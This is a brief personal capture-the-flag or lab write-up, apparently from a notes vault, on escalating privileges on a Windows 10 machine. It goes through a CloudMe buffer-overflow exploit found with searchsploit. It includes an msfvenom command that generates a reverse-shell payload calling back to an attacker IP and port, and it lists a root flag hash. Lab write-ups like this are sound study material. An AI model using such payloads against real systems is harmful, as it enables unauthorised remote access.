running winpeas
OS Name:                   Microsoft Windows 10 Enterprise                                                                    
found a cloudme service running on the server 
checking serachsploit for cloudme and we found a [BOF] script 
changing the payload in the script and adding my own msfvenom
`msfvenom -a x86  -p windows/shell_reverse_tcp LHOST=10.10.16.7 LPORT=9003 -b '\x00\x0A\x0D' -f python -v payload`
![[Pasted image 20230228211703.png]]
changing payload and adding our new generated payload 
![[Pasted image 20230228211728.png]]

script to get a shell back using [[03 Commands/Linux/Pivoting]] to tunnel the service to my machine because windows machine doesn't have python so i cant run the script on the server 
![[Pasted image 20211007231336.png]]
![[Pasted image 20211007231353.png]]
and we are root!
![[Pasted image 20211007230727.png]]
#rootflag 77df67ea22129ca52d18bd9a1c421280
![[Pasted image 20211007230536.png]]
